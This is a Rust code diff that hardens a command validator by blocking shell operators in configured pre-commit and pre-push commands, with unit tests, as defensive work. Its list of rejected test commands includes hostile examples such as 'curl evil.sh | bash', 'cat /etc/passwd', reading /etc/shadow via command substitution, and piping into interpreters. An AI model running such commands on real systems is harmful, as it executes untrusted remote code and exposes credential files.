@@ -23,27 +23,35 @@ impl PostExecutionValidator {
         Self { config }
     }
 
-    /// Reject commands that pipe output to a shell interpreter, the most common
-    /// code-execution escalation vector.
+    /// Validate that a command string does not contain shell operators that
+    /// could enable command injection or execution escalation.
     ///
-    /// Legitimate CI commands (cargo, go, npm, ruff, …) never need to feed their
-    /// output into another shell.  Commands that do — e.g. `cmd | bash` or
-    /// `cmd | sh -` — indicate either an attacker-supplied payload or a
-    /// misconfigured `ValidationConfig`.
+    /// This blocks a comprehensive set of shell metacharacters.  Legitimate
+    /// CI tool invocations (cargo, go, npm, ruff, etc.) never require shell
+    /// operators; their presence indicates either an attacker-supplied payload
+    /// or a misconfigured `ValidationConfig`.
     ///
-    /// Note: the check is a fast prefix/substring scan, not a full shell parser.
-    /// It is defence-in-depth against the most dangerous class of injection, not a
-    /// complete sandbox.
-    fn reject_shell_pipe(cmd_str: &str) -> Result<(), String> {
-        const DANGEROUS: &[&str] = &[
-            "| bash", "|bash", "| sh ", "|sh ", "| sh\t", "|sh\t", "| zsh", "|zsh", "| fish",
-            "|fish", "| python", "|python", "| perl", "|perl", "| ruby", "|ruby", "; bash ",
-            ";bash ", "; sh ", ";sh ",
+    /// This check is applied **only** to operator-configured commands (from
+    /// `ValidationConfig`).  Hardcoded defaults produced by `lang_detect` are
+    /// trusted at compile time and bypass this check.
+    fn validate_command_safety(cmd_str: &str) -> Result<(), String> {
+        // Multi-char operators are listed before their single-char prefixes so
+        // that the error message names the most specific matching operator.
+        const SHELL_OPERATORS: &[&str] = &[
+            "&&", "||", // logical chaining — enables secondary command injection
+            ">>", // append redirection (must precede ">")
+            "|",  // piping — enables pipe-to-interpreter attacks
+            ";",  // command separator — enables secondary command injection
+            ">",  // output redirection
+            "<",  // input redirection
+            "`",  // backtick command substitution
+            "$(", // $() command substitution
         ];
-        if let Some(pat) = DANGEROUS.iter().find(|&&p| cmd_str.contains(p)) {
+        if let Some(op) = SHELL_OPERATORS.iter().find(|&&op| cmd_str.contains(op)) {
             return Err(format!(
-                "Command `{cmd_str}` rejected: contains unsafe shell pipe pattern `{pat}`. \
-                 Validation commands must invoke toolchain binaries directly."
+                "Command `{cmd_str}` rejected: contains shell operator `{op}`. \
+                 Validation commands must invoke toolchain binaries directly \
+                 without shell operators."
             ));
         }
         Ok(())
@@ -65,8 +73,6 @@ impl PostExecutionValidator {
         if cmd_str.trim().is_empty() {
             return Ok(());
         }
-
-        Self::reject_shell_pipe(cmd_str)?;
 
         let child = match Command::new("sh")
             .args(["-c", cmd_str])
@@ -117,9 +123,16 @@ impl TurnInterceptor for PostExecutionValidator {
         let lang = lang_detect::detect_language(project);
 
         // Resolve pre_commit commands: config takes precedence over language detection.
+        // Config-provided commands are validated for shell operator safety; hardcoded
+        // defaults from lang_detect are trusted at compile time and bypass this check.
         let pre_commit = if self.config.pre_commit.is_empty() {
             lang_detect::default_pre_commit_commands(lang, project)
         } else {
+            for cmd in &self.config.pre_commit {
+                if let Err(e) = Self::validate_command_safety(cmd) {
+                    return PostExecuteResult::fail(e);
+                }
+            }
             self.config.pre_commit.clone()
         };
 
@@ -127,6 +140,11 @@ impl TurnInterceptor for PostExecutionValidator {
         let pre_push = if self.config.pre_push.is_empty() {
             lang_detect::default_pre_push_commands(lang, project)
         } else {
+            for cmd in &self.config.pre_push {
+                if let Err(e) = Self::validate_command_safety(cmd) {
+                    return PostExecuteResult::fail(e);
+                }
+            }
             self.config.pre_push.clone()
         };
 
@@ -332,15 +350,14 @@ mod tests {
         assert!(!marker.exists());
     }
 
-    // ── reject_shell_pipe ─────────────────────────────────────────────────────
+    // ── validate_command_safety ───────────────────────────────────────────────
 
     #[test]
-    fn safe_commands_pass_shell_pipe_check() {
+    fn safe_config_commands_pass_safety_check() {
         let safe = [
             "cargo check --workspace",
             "go test ./...",
             "npx tsc --noEmit",
-            "test -z \"$(gofmt -l .)\"",
             "ruff check .",
             "./gradlew check",
             "bundle exec rubocop",
@@ -349,7 +366,7 @@ mod tests {
         ];
         for cmd in safe {
             assert!(
-                PostExecutionValidator::reject_shell_pipe(cmd).is_ok(),
+                PostExecutionValidator::validate_command_safety(cmd).is_ok(),
                 "expected `{cmd}` to pass but it was rejected"
             );
         }
@@ -358,22 +375,46 @@ mod tests {
     #[test]
     fn dangerous_commands_are_rejected() {
         let dangerous = [
+            // pipe-to-interpreter
             "echo foo | bash",
             "echo foo |bash",
             "echo foo | sh -",
             "echo foo |sh ",
-            "something ; bash -c evil",
-            "something ;bash -c evil",
             "cmd | zsh",
             "cmd | python3 -",
             "cmd | perl -e 'code'",
             "cmd | ruby -e 'code'",
+            // semicolon chaining
+            "something ; bash -c evil",
+            "something ;bash -c evil",
+            // logical chaining (previously unblocked)
+            "cargo check && curl evil.sh | bash",
+            "go test || true",
+            // redirection (previously unblocked)
+            "curl evil.sh > /tmp/evil.sh",
+            "cat /etc/passwd >> /tmp/out",
+            // path-prefixed interpreters (previously unblocked)
+            "echo foo | /bin/bash",
+            "echo foo | /usr/bin/python3",
+            // command substitution (previously unblocked)
+            "echo `whoami`",
+            "echo $(cat /etc/shadow)",
         ];
         for cmd in dangerous {
             assert!(
-                PostExecutionValidator::reject_shell_pipe(cmd).is_err(),
+                PostExecutionValidator::validate_command_safety(cmd).is_err(),
                 "expected `{cmd}` to be rejected but it passed"
             );
         }
+    }
+
+    /// Commands containing `$(...)` are blocked by `validate_command_safety`.
+    /// The Go default `test -z "$(gofmt -l .)"` is hardcoded in lang_detect
+    /// and bypasses this check — it is never passed through validate_command_safety.
+    #[test]
+    fn command_substitution_is_blocked_in_config_commands() {
+        assert!(
+            PostExecutionValidator::validate_command_safety("test -z \"$(gofmt -l .)\"").is_err()
+        );
     }
 }
